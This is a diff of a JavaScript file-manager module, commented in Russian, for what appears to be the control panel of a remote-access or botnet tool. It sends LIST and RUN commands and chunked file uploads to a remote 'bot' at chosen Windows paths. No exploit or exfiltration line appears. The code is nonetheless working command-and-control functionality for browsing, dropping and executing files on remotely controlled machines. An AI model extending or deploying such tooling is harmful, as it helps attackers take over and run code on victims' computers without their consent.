@@ -1,52 +1,89 @@
 // frontend/client_control/js/modules/features/fm/FileManagerAPI.js
 
+/**
+ * API для работы с файлами. 
+ * Реализовано строго по формулам протокола FileManager.
+ */
 export const FileManagerAPI = {
-  // Отправка JSON-команд (Листинг, Запуск, Удаление)
-  send: (action, path, extra = {}) => {
-    const isHidden = document.getElementById('file-view-btn')?.classList.contains('active');
-    const payload = {
-      action,
-      path: path === "Computer" ? "" : path,
-      show_hidden: !!isHidden,
-      ...extra
-    };
-    window.sendToBot?.('FileManager', payload); 
+  send: (action, path = "") => {
+    // 1. Определяем "чистую" команду для бота
+    // Если пришло 'list_drives' или 'open', для бота это всегда 'LIST'
+    const isNavigation = ['LIST', 'list_drives', 'open'].includes(action);
+    const protocolAction = isNavigation ? 'LIST' : action.toUpperCase();
+
+    // 2. Определяем путь. Если пусто — отправляем "Computer" или пустую строку
+    let targetPath = (path === "Computer" || !path || action === 'list_drives') ? "" : path;
+
+    // 3. Формируем payload. 
+    // ВАЖНО: Для LIST бот не ждет payload, но мы можем передать пустой объект,
+    // чтобы sendToBot распознал это как 'json' тип пакета.
+    const payload = {}; 
+
+    console.log(`[API] Отправка: Модуль=FileManager, Действие=${protocolAction}, Путь=${targetPath}`);
+    
+    if (window.sendToBot) {
+        // Вызываем согласно сигнатуре в connection.js:
+        // sendToBot(modName, pay, action, extra)
+        window.sendToBot(
+            'FileManager',   // modName
+            payload,         // pay (пустой объект заставит софт поставить type: "json")
+            protocolAction,  // action (LIST, RUN, etc)
+            targetPath       // extra (наш путь)
+        );
+    }
   },
 
-  // Потоковая загрузка файла НА БОТ (Upload)
+  /**
+   * 3. ЗАГРУЗКА НА БОТ (UT - Upload Transfer)
+   * Формула: UT_START (int) -> UT_DATA (bin)
+   * 
+   * @param {File} file - Объект файла из браузера
+   * @param {string} currentPath - Текущая папка в проводнике
+   */
   upload: async (file, currentPath) => {
-    const CHUNK_SIZE = 65536;
+    const CHUNK_SIZE = 65536; // 64 КБ на чанк
     const wait = ms => new Promise(r => setTimeout(r, ms));
     
-    // --- ИСПРАВЛЕНИЕ ПУТИ ---
-    // 1. Очищаем путь (если мы в корне дисков, путь пустой)
+    // Формируем корректный путь для Windows
     let cleanPath = (currentPath === "Computer" || !currentPath) ? "" : currentPath;
-    
-    // 2. Добавляем слеш в конец, если его нет
     if (cleanPath && !cleanPath.endsWith('\\') && !cleanPath.endsWith('/')) {
         cleanPath += '\\';
     }
-    
-    // 3. Формируем полный путь: ПАПКА + ИМЯ ФАЙЛА
     const fullRemotePath = cleanPath + file.name;
 
-    console.log(`[Upload] Target path: ${fullRemotePath}`);
+    console.log(`[UT] Начинаю загрузку: ${file.name} (Размер: ${file.size} байт)`);
 
-    // Анонс: передаем ПОЛНЫЙ путь в метаданных (после двоеточия)
-    window.sendToBot?.(`FileTransfer:${fullRemotePath}`, file.size);
-    await wait(150); 
+    /**
+     * ШАГ 1: Анонс размера (UT_START)
+     * Формула: Тип "int", payload - размер файла.
+     */
+    window.sendToBot?.('FileManager', file.size, 'int', 'UT_START', fullRemotePath);
+    
+    // Небольшая пауза, чтобы бот успел создать файл на диске
+    await wait(300); 
 
+    /**
+     * ШАГ 2: Передача данных (UT_DATA) по частям
+     */
     let offset = 0;
     while (offset < file.size) {
         const chunk = await file.slice(offset, offset + CHUNK_SIZE).arrayBuffer();
         
-        // Стрим: также используем ПОЛНЫЙ путь, чтобы бот знал, в какой файл писать чанк
-        window.sendToBot?.(`FileTransferStream:${fullRemotePath}`, new Uint8Array(chunk));
+        // Формула: Тип "bin", payload - байты (Uint8Array)
+        window.sendToBot?.(
+            'FileManager', 
+            new Uint8Array(chunk), 
+            'bin', 
+            'UT_DATA', 
+            fullRemotePath
+        );
         
         offset += CHUNK_SIZE;
-        await wait(5); 
+        
+        // Пауза 10мс, чтобы не "забить" сетевой канал
+        await wait(10); 
     }
     
-    console.log(`[Upload] Finished: ${file.name}`);
+    console.log(`[UT] Файл успешно отправлен: ${file.name}`);
   }
 };
